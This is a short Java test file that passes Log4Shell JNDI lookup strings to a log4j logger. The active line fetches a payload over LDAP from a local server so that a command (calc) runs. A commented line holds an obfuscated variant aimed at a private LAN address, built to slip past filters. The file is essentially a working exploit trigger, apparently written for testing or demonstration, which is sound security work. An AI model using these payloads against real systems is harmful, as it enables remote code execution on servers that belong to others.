import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Test {
    private static final Logger logger = LogManager.getLogger(Test.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/Basic/Command/calc}");
//        logger.error("${${a:-j}ndi:ldap://192.168.3.46:1389/aw1pnx}");
    }
}